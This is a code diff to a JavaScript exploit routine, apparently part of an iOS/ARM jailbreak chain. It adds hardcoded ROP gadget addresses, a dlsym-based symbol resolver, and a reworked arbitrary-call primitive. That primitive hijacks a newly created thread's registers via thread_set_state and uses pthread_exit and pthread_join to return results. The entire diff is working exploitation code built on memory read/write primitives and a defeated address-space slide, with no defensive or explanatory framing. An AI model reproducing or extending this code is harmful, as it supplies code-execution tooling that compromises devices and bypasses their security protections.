@@ -24,7 +24,15 @@ var countptrptr = 0x132000;
 var thptrptr = 0x132004;
 var thread_stateptrptr = 0x132008;
 
+var pthread_exit = 0x20633048 | 1;
+var pthread_join = 0x20636af4 | 1;
+var add_sp_0x3c = 0x23d72b5a | 1;
+var mov_r1_r0 = 0x72f76 | 1;
+var mov_r0 = 0xee40 | 1;
+var str_r0_r4 = 0x85474 | 1;
+
 var stack_shit = 0x161000;
+var pthread_ret = 0; 
 
 function get_dyld_shc_slide() {
 	/*
@@ -120,6 +128,18 @@ function calls4arg(sym, r0, r1, r2, r3) {
 
 var rth = 0;
 
+function symaddr(sym) {
+	if (sym in sym_cache) {
+		var addy = sym_cache[sym];
+	} else {
+		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
+		var shc_slide = read_u32(reserve_addr + 20 + slid);
+		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, sptr(sym), 0, 0);
+		sym_cache[sym] = addy;
+	}
+	return addy;
+}
+
 function callnarg() {
 	if (arguments.length < 1) {
 		return printf("error: tried to run callnarg without args. arguments.length=%d\n", arguments.length);
@@ -151,18 +171,15 @@ function callnarg() {
 	/*
 	 *  if the thread doesn't exist, create it.
 	 */
-	if (read_u32(th) === 0) {
-		calls4arg("pthread_create", threadptr, 0, __stack_chk_fail_resolver + dyld_shc_slide, 0);
-		thread = read_u32(threadptr);
-		write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
-		rth = read_u32(th);
-	}
+	calls4arg("pthread_create", threadptr, 0, __stack_chk_fail_resolver + dyld_shc_slide, 0);
+	thread = read_u32(threadptr);
+	write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
+	rth = read_u32(th);
+	calls4arg("thread_suspend", rth, 0, 0, 0);
 
-	if (rth === 0) {
-		rth = read_u32(th);
+	if (pthread_ret == 0) {
+		pthread_ret = malloc(4);
 	}
-
-//	calls4arg("thread_suspend", rth, 0, 0, 0);
 
 	/*
 	 *  write first 4 to r0-r3, rest to stack
@@ -175,10 +192,9 @@ function callnarg() {
 		}
 	}
 
-	/*
-	 *  r9
-	 */
-	write_u32(thread_state + (11 << 2), 0x1337);
+	var stack_shit_ret_offset = 0x58;
+
+	write_u32(stack_shit + stack_shit_ret_offset, pthread_exit + dyld_shc_slide);
 
 	/*
 	 *  stack
@@ -188,7 +204,7 @@ function callnarg() {
 	/*
 	 *  return address, infinite loop
 	 */
-	write_u32(thread_state + (14 << 2), __stack_chk_fail_resolver + dyld_shc_slide);
+	write_u32(thread_state + (14 << 2), add_sp_0x3c + dyld_shc_slide);
 
 	/*
 	 *  pc
@@ -210,27 +226,10 @@ function callnarg() {
 	calls4arg("thread_set_state", rth, ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);
 	calls4arg("thread_resume", rth, 0, 0, 0);
 
-	/*
-	 *  spin wait for return
-	 */
-	while (true) {
-		/*
-		 *  reset, it's used as input for thread_state size
-		 */
-		write_u32(count, 17);
-		calls4arg("thread_get_state", rth, ARM_THREAD_STATE, thread_state, count);
-
-		/*
-		 *  if the pc is in (resolver, resolver + 8), suspend the thread
-		 *  (to not spin endlessly), read r0 and return
-		 */
-		if (((read_u32(thread_state + (15 << 2)) - (__stack_chk_fail_resolver + dyld_shc_slide)) <= 8) && (read_u32(thread_state + (11 << 2)) == 0x1337)) {
-			calls4arg("thread_suspend", rth, 0, 0, 0);
-			return read_u32(thread_state);
-		}
-
-//		calls4arg("usleep", 1000, 0, 0, 0);
-	}
+	calls4arg("pthread_join", thread, pthread_ret, 0, 0);
+	write_u32(count, 17);
+	calls4arg("thread_get_state", rth, ARM_THREAD_STATE, thread_state, count);
+	return read_u32(pthread_ret);
 }
 
 /*
